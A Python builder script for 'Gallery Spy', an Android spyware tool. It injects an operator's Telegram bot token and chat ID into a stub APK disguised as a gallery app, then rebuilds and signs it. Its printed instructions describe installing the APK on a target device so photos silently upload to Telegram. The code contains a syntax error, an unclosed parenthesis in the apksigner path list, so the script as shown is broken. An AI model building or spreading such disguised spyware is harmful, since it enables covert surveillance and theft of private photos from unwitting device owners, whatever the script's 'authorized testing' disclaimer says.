#!/usr/bin/env python3
"""
Gallery Spy APK Builder
Modifies Telegram configuration and rebuilds APK
"""

import os
import sys
import subprocess
import shutil
import re
import platform
from pathlib import Path
from datetime import datetime

class Colors:
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

class GallerySpyBuilder:
    def __init__(self):
        self.banner = f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════╗
║        {Colors.RED}  ██████╗  █████╗ ██╗     ██╗     ███████╗██████╗ ██╗   ██╗{Colors.CYAN}║
║        {Colors.RED} ██╔════╝ ██╔══██╗██║     ██║     ██╔════╝██╔══██╗╚██╗ ██╔╝{Colors.CYAN}║
║        {Colors.RED} ██║  ███╗███████║██║     ██║     █████╗  ██████╔╝ ╚████╔╝ {Colors.CYAN}║
║        {Colors.RED} ██║   ██║██╔══██║██║     ██║     ██╔══╝  ██╔══██╗  ╚██╔╝  {Colors.CYAN}║
║        {Colors.RED} ╚██████╔╝██║  ██║███████╗███████╗███████╗██║  ██║   ██║   {Colors.CYAN}║
║        {Colors.RED}  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   {Colors.CYAN}║
║                                                           ║
║          {Colors.YELLOW}Gallery Spy APK Builder v1.0{Colors.CYAN}              ║
║          {Colors.GREEN}Telegram Photo Exfiltration Tool{Colors.CYAN}         ║
║                                                           ║
║          {Colors.BOLD}Developed by: {Colors.YELLOW}NIGHTKING{Colors.CYAN}                    ║
║          {Colors.BOLD}GitHub: {Colors.YELLOW}https://github.com/offsecnight{Colors.CYAN}    ║
╚═══════════════════════════════════════════════════════════╝{Colors.END}

{Colors.YELLOW}[!] FOR AUTHORIZED SECURITY TESTING ONLY{Colors.END}
"""
        
        self.base_dir = Path(__file__).parent
        self.stub_dir = self.base_dir / "stub"
        self.work_dir = None
        self.apktool_jar = self.base_dir / "apktool.jar"
        self.keystore_path = self.base_dir / "keystore" / "keystore"
        self.output_dir = self.base_dir / "output"
        self.config = {}
        
    def print_banner(self):
        print(self.banner)
    
    def check_requirements(self):
        """Check required tools"""
        print(f"{Colors.CYAN}[*] Checking requirements...{Colors.END}")
        
        # Check Java
        try:
            subprocess.run(['java', '-version'], capture_output=True, check=True)
            print(f"{Colors.GREEN}[✓] Java found{Colors.END}")
        except:
            print(f"{Colors.RED}[✗] Java not found{Colors.END}")
            print(f"{Colors.YELLOW}[!] Install Java: https://www.oracle.com/java/technologies/downloads/{Colors.END}")
            return False
        
        # Check apktool
        if not self.apktool_jar.exists():
            print(f"{Colors.YELLOW}[!] apktool.jar not found, downloading...{Colors.END}")
            if not self.download_apktool():
                return False
        print(f"{Colors.GREEN}[✓] apktool.jar found{Colors.END}")
        
        # Check stub
        if not self.stub_dir.exists():
            print(f"{Colors.RED}[✗] stub folder not found{Colors.END}")
            return False
        print(f"{Colors.GREEN}[✓] Stub APK found{Colors.END}")
        
        # Check keystore
        if not self.keystore_path.exists():
            print(f"{Colors.YELLOW}[!] Keystore not found, will create{Colors.END}")
        else:
            print(f"{Colors.GREEN}[✓] Keystore found{Colors.END}")
        
        print()
        return True
    
    def download_apktool(self):
        """Download apktool if missing"""
        try:
            import urllib.request
            url = "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
            print(f"{Colors.CYAN}[*] Downloading apktool...{Colors.END}")
            urllib.request.urlretrieve(url, str(self.apktool_jar))
            print(f"{Colors.GREEN}[✓] apktool downloaded{Colors.END}")
            return True
        except Exception as e:
            print(f"{Colors.RED}[✗] Failed to download apktool: {e}{Colors.END}")
            return False
    
    def get_config(self):
        """Get build configuration"""
        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}           TELEGRAM CONFIGURATION                          {Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}\n")
        
        print(f"{Colors.YELLOW}This app will automatically upload photos to your Telegram bot{Colors.END}\n")
        
        # Telegram Bot Token
        bot_token = input(f"{Colors.YELLOW}[?] Telegram Bot Token: {Colors.END}").strip()
        if not bot_token:
            print(f"{Colors.RED}[✗] Bot token is required{Colors.END}")
            return False
        
        # Telegram Chat ID
        chat_id = input(f"{Colors.YELLOW}[?] Telegram Chat ID: {Colors.END}").strip()
        if not chat_id:
            print(f"{Colors.RED}[✗] Chat ID is required{Colors.END}")
            return False
        
        self.config['bot_token'] = bot_token
        self.config['chat_id'] = chat_id
        
        print(f"\n{Colors.GREEN}[✓] Telegram configured{Colors.END}")
        print(f"{Colors.CYAN}Bot Token:{Colors.END} {bot_token[:20]}...")
        print(f"{Colors.CYAN}Chat ID:{Colors.END}   {chat_id}\n")
        
        # App Customization
        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}           APP CUSTOMIZATION                               {Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}\n")
        
        # App Name
        self.config['app_name'] = input(f"{Colors.YELLOW}[?] App Name (default: Gallery): {Colors.END}").strip() or "Gallery"
        
        # Package Name
        self.config['package'] = input(f"{Colors.YELLOW}[?] Package (default: com.photo.gallery): {Colors.END}").strip() or "com.photo.gallery"
        
        # Icon
        try:
            from PIL import Image
            PIL_AVAILABLE = True
        except:
            PIL_AVAILABLE = False
        
        if PIL_AVAILABLE:
            icon_prompt = f"{Colors.YELLOW}[?] Icon path (press Enter to skip): {Colors.END}"
            icon_path = input(icon_prompt).strip()
            
            if icon_path:
                icon_file = Path(icon_path)
                if icon_file.exists():
                    self.config['icon'] = icon_file
                    print(f"{Colors.GREEN}[✓] Icon will be changed: {icon_file.name}{Colors.END}")
                else:
                    self.config['icon'] = None
                    print(f"{Colors.YELLOW}[!] Icon not found, using default{Colors.END}")
            else:
                self.config['icon'] = None
                print(f"{Colors.YELLOW}[!] Using default icon{Colors.END}")
        else:
            self.config['icon'] = None
            print(f"{Colors.YELLOW}[!] Pillow not installed, icon change disabled{Colors.END}")
            print(f"{Colors.YELLOW}[!] Install: pip install Pillow{Colors.END}")
        
        print(f"\n{Colors.GREEN}[✓] Configuration complete{Colors.END}\n")
        
        return True
    
    def create_working_directory(self):
        """Create temporary working directory"""
        print(f"{Colors.CYAN}[*] Preparing build environment...{Colors.END}", end='', flush=True)
        
        try:
            temp_base = self.base_dir / "temp"
            temp_base.mkdir(exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.work_dir = temp_base / f"build_{timestamp}"
            
            shutil.copytree(self.stub_dir, self.work_dir)
            
            print(f"\r{Colors.GREEN}[✓] Build environment ready{Colors.END}" + " " * 30)
            return True
            
        except Exception as e:
            print(f"\r{Colors.RED}[✗] Failed: {e}{Colors.END}")
            return False
    
    def cleanup_working_directory(self):
        """Delete temporary working directory"""
        if self.work_dir and self.work_dir.exists():
            try:
                shutil.rmtree(self.work_dir)
            except:
                pass
    
    def modify_telegram_config(self):
        """Modify TelegramConfig.smali and PhotoUploadService.smali with user credentials"""
        print(f"{Colors.CYAN}[*] Configuring Telegram settings...{Colors.END}", end='', flush=True)
        
        # 1. Update TelegramConfig.smali
        config_file = self.work_dir / "smali/com/photo/gallery/TelegramConfig.smali"
        
        if not config_file.exists():
            print(f"\r{Colors.RED}[✗] TelegramConfig.smali not found{Colors.END}")
            return False
        
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Replace BOT_TOKEN
            content = re.sub(
                r'(\.field public static final BOT_TOKEN:Ljava/lang/String; = )"[^"]*"',
                rf'\1"{self.config["bot_token"]}"',
                content
            )
            
            # Replace CHAT_ID
            content = re.sub(
                r'(\.field public static final CHAT_ID:Ljava/lang/String; = )"[^"]*"',
                rf'\1"{self.config["chat_id"]}"',
                content
            )
            
            # Replace TELEGRAM_API_URL
            api_url = f"https://api.telegram.org/bot{self.config['bot_token']}/"
            content = re.sub(
                r'(\.field public static final TELEGRAM_API_URL:Ljava/lang/String; = )"[^"]*"',
                rf'\1"{api_url}"',
                content
            )
            
            with open(config_file, 'w', encoding='utf-8') as f:
                f.write(content)
            
        except Exception as e:
            print(f"\r{Colors.RED}[✗] Failed to update TelegramConfig: {e}{Colors.END}")
            return False
        
        # 2. Update PhotoUploadService.smali
        upload_service = self.work_dir / "smali/com/photo/gallery/PhotoUploadService.smali"
        
        if upload_service.exists():
            try:
                with open(upload_service, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # Replace hardcoded chat_id values
                content = re.sub(
                    r'(const-string v\d+, )"8123598428"',
                    rf'\1"{self.config["chat_id"]}"',
                    content
                )
                
                # Replace hardcoded bot token in sendMessage URL
                send_message_url = f"https://api.telegram.org/bot{self.config['bot_token']}/sendMessage"
                content = re.sub(
                    r'(const-string v\d+, )"https://api\.telegram\.org/bot[^/]+/sendMessage"',
                    rf'\1"{send_message_url}"',
                    content
                )
                
                # Replace hardcoded bot token in sendPhoto URL
                send_photo_url = f"https://api.telegram.org/bot{self.config['bot_token']}/sendPhoto"
                content = re.sub(
                    r'(const-string v\d+, )"https://api\.telegram\.org/bot[^/]+/sendPhoto"',
                    rf'\1"{send_photo_url}"',
                    content
                )
                
                with open(upload_service, 'w', encoding='utf-8') as f:
                    f.write(content)
                
            except Exception as e:
                print(f"\r{Colors.YELLOW}[!] Warning: Failed to update PhotoUploadService: {e}{Colors.END}")
        
        print(f"\r{Colors.GREEN}[✓] Telegram configured in all files{Colors.END}" + " " * 30)
        return True
    
    def modify_manifest(self):
        """Modify AndroidManifest.xml"""
        manifest_file = self.work_dir / "AndroidManifest.xml"
        
        if not manifest_file.exists():
            return True
        
        try:
            with open(manifest_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Update app label
            content = re.sub(
                r'android:label="[^"]*"',
                f'android:label="{self.config["app_name"]}"',
                content,
                count=1
            )
            
            # Update package name
            content = re.sub(
                r'package="[^"]*"',
                f'package="{self.config["package"]}"',
                content
            )
            
            with open(manifest_file, 'w', encoding='utf-8') as f:
                f.write(content)
            
            return True
            
        except Exception as e:
            print(f"\r{Colors.YELLOW}[!] Warning: Failed to update manifest: {e}{Colors.END}")
            return True
    
    def modify_strings(self):
        """Modify strings.xml"""
        strings_file = self.work_dir / "res/values/strings.xml"
        
        if not strings_file.exists():
            return True
        
        try:
            with open(strings_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Update app name
            content = re.sub(
                r'<string name="app_name">[^<]*</string>',
                f'<string name="app_name">{self.config["app_name"]}</string>',
                content
            )
            
            with open(strings_file, 'w', encoding='utf-8') as f:
                f.write(content)
            
            return True
            
        except Exception as e:
            print(f"\r{Colors.YELLOW}[!] Warning: Failed to update strings: {e}{Colors.END}")
            return True
    
    def change_icon(self):
        """Change app icon"""
        if not self.config.get('icon'):
            return True
        
        try:
            from PIL import Image
            
            icon_sizes = {
                'mdpi': 48,
                'hdpi': 72,
                'xhdpi': 96,
                'xxhdpi': 144,
                'xxxhdpi': 192
            }
            
            original_icon = Image.open(self.config['icon'])
            
            if original_icon.mode != 'RGBA':
                original_icon = original_icon.convert('RGBA')
            
            for density, size in icon_sizes.items():
                mipmap_dir = self.work_dir / f"res/mipmap-{density}"
                
                if mipmap_dir.exists():
                    resized_icon = original_icon.resize((size, size), Image.Resampling.LANCZOS)
                    
                    icon_file = mipmap_dir / "ic_launcher.png"
                    resized_icon.save(icon_file, 'PNG')
                    
                    round_icon_file = mipmap_dir / "ic_launcher_round.png"
                    resized_icon.save(round_icon_file, 'PNG')
            
            return True
            
        except Exception as e:
            print(f"\r{Colors.YELLOW}[!] Warning: Failed to change icon: {e}{Colors.END}")
            return True
    
    def rebuild_apk(self):
        """Rebuild APK using apktool"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}                  BUILDING APK                             {Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}\n")
        
        output_apk = self.base_dir / "output.apk"
        
        if output_apk.exists():
            output_apk.unlink()
        
        cmd = [
            'java', '-jar', str(self.apktool_jar),
            'b', str(self.work_dir),
            '-o', str(output_apk)
        ]
        
        print(f"{Colors.YELLOW}[*] Building APK (this may take a minute)...{Colors.END}")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"{Colors.GREEN}[✓] APK built successfully{Colors.END}")
                return output_apk
            else:
                print(f"{Colors.RED}[✗] Build failed:{Colors.END}")
                print(result.stderr)
                return None
        except Exception as e:
            print(f"{Colors.RED}[✗] Build error: {e}{Colors.END}")
            return None
    
    def sign_apk(self, unsigned_apk):
        """Sign APK with keystore"""
        print(f"\n{Colors.CYAN}[*] Signing APK...{Colors.END}")
        
        KEYSTORE_PASSWORD = '12345678'
        KEY_ALIAS = 'key0'
        KEY_PASSWORD = '12345678'
        
        # Create keystore if doesn't exist
        if not self.keystore_path.exists():
            print(f"{Colors.YELLOW}[*] Creating keystore...{Colors.END}")
            self.keystore_path.parent.mkdir(parents=True, exist_ok=True)
            
            cmd = [
                'keytool', '-genkey', '-v',
                '-keystore', str(self.keystore_path),
                '-alias', KEY_ALIAS,
                '-keyalg', 'RSA',
                '-keysize', '2048',
                '-validity', '10000',
                '-storepass', KEYSTORE_PASSWORD,
                '-keypass', KEY_PASSWORD,
                '-dname', 'CN=Gallery, OU=Photo, O=Gallery, L=City, S=State, C=US'
            ]
            
            subprocess.run(cmd, capture_output=True)
            print(f"{Colors.GREEN}[✓] Keystore created{Colors.END}")
        
        signed_apk = self.base_dir / "signed.apk"
        if signed_apk.exists():
            signed_apk.unlink()
        
        # Try apksigner first
        try:
            apksigner_cmd = self.find_apksigner()
            
            if apksigner_cmd:
                print(f"{Colors.CYAN}[*] Using apksigner...{Colors.END}")
                cmd = [
                    apksigner_cmd, 'sign',
                    '--ks', str(self.keystore_path),
                    '--ks-key-alias', KEY_ALIAS,
                    '--ks-pass', f'pass:{KEYSTORE_PASSWORD}',
                    '--key-pass', f'pass:{KEY_PASSWORD}',
                    '--out', str(signed_apk),
                    str(unsigned_apk)
                ]
                
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    print(f"{Colors.GREEN}[✓] APK signed successfully{Colors.END}")
                    return signed_apk
                else:
                    raise Exception("apksigner failed")
            else:
                raise Exception("apksigner not found")
                
        except:
            # Fallback to jarsigner
            print(f"{Colors.CYAN}[*] Using jarsigner...{Colors.END}")
            
            cmd = [
                'jarsigner',
                '-verbose',
                '-sigalg', 'SHA256withRSA',
                '-digestalg', 'SHA-256',
                '-keystore', str(self.keystore_path),
                '-storepass', KEYSTORE_PASSWORD,
                '-keypass', KEY_PASSWORD,
                str(unsigned_apk),
                KEY_ALIAS
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                shutil.move(str(unsigned_apk), str(signed_apk))
                print(f"{Colors.GREEN}[✓] APK signed successfully{Colors.END}")
                return signed_apk
            else:
                print(f"{Colors.RED}[✗] Signing failed:{Colors.END}")
                print(result.stderr)
                return None
    
    def find_apksigner(self):
        """Find apksigner in Android SDK"""
        possible_paths = [
            Path.home() / "AppData/Local/Android/Sdk/build-tools",
            Path("C:/Android/Sdk/build-tools"),
            Path("/usr/local/android-sdk/build-tools",
            Path.home() / "Android/Sdk/build-tools",
        ]
        
        for sdk_path in possible_paths:
            if sdk_path.exists():
                versions = sorted([d for d in sdk_path.iterdir() if d.is_dir()], reverse=True)
                for version_dir in versions:
                    if platform.system() == 'Windows':
                        apksigner = version_dir / "apksigner.bat"
                    else:
                        apksigner = version_dir / "apksigner"
                    
                    if apksigner.exists():
                        return str(apksigner)
        
        try:
            result = subprocess.run(['apksigner', '--version'], capture_output=True)
            if result.returncode == 0:
                return 'apksigner'
        except:
            pass
        
        return None
    
    def copy_to_output(self, signed_apk):
        """Copy final APK to output folder"""
        print(f"\n{Colors.CYAN}[*] Copying to output folder...{Colors.END}")
        
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"GallerySpy_{self.config['app_name'].replace(' ', '_')}_{timestamp}.apk"
        final_apk = self.output_dir / filename
        
        shutil.copy2(signed_apk, final_apk)
        
        size_mb = final_apk.stat().st_size / (1024 * 1024)
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}═══════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}                  BUILD COMPLETE                           {Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}═══════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.CYAN}APK:{Colors.END}          {final_apk}")
        print(f"{Colors.CYAN}Size:{Colors.END}         {size_mb:.2f} MB")
        print(f"{Colors.CYAN}App Name:{Colors.END}     {self.config['app_name']}")
        print(f"{Colors.CYAN}Package:{Colors.END}      {self.config['package']}")
        print(f"{Colors.CYAN}Bot Token:{Colors.END}    {self.config['bot_token'][:20]}...")
        print(f"{Colors.CYAN}Chat ID:{Colors.END}      {self.config['chat_id']}")
        if self.config.get('icon'):
            print(f"{Colors.CYAN}Icon:{Colors.END}         Changed")
        print(f"{Colors.BOLD}{Colors.GREEN}═══════════════════════════════════════════════════════════{Colors.END}")
        print(f"\n{Colors.BOLD}{Colors.YELLOW}[*] INSTALLATION:{Colors.END}")
        print(f"{Colors.GREEN}    1. Install APK on target device{Colors.END}")
        print(f"{Colors.GREEN}    2. Grant storage permissions{Colors.END}")
        print(f"{Colors.GREEN}    3. Photos will auto-upload to Telegram{Colors.END}")
        print(f"\n{Colors.BOLD}{Colors.RED}[!] DISCLAIMER:{Colors.END}")
        print(f"{Colors.YELLOW}    This tool is for AUTHORIZED SECURITY TESTING ONLY.{Colors.END}")
        print(f"{Colors.YELLOW}    Unauthorized surveillance is ILLEGAL.{Colors.END}")
        print(f"{Colors.YELLOW}    The developer assumes NO responsibility for misuse.{Colors.END}\n")
        
        return final_apk
    
    def run(self):
        """Main build process"""
        self.print_banner()
        
        if not self.check_requirements():
            return
        
        if not self.get_config():
            return
        
        if not self.create_working_directory():
            return
        
        try:
            print(f"{Colors.CYAN}[*] Applying configuration...{Colors.END}", end='', flush=True)
            
            if not self.modify_telegram_config():
                return
            
            if not self.modify_manifest():
                return
            
            if not self.modify_strings():
                return
            
            print(f"\r{Colors.GREEN}[✓] Configuration applied{Colors.END}" + " " * 30)
            
            if self.config.get('icon'):
                print(f"{Colors.CYAN}[*] Preparing icon...{Colors.END}", end='', flush=True)
                if not self.change_icon():
                    return
                print(f"\r{Colors.GREEN}[✓] Icon changed{Colors.END}" + " " * 30)
            
            unsigned_apk = self.rebuild_apk()
            if not unsigned_apk:
                return
            
            signed_apk = self.sign_apk(unsigned_apk)
            if not signed_apk:
                return
            
            final_apk = self.copy_to_output(signed_apk)
            
            print(f"{Colors.GREEN}[✓] Build complete! APK ready to deploy.{Colors.END}\n")
            
        finally:
            self.cleanup_working_directory()

def main():
    try:
        builder = GallerySpyBuilder()
        builder.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Build cancelled{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.END}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
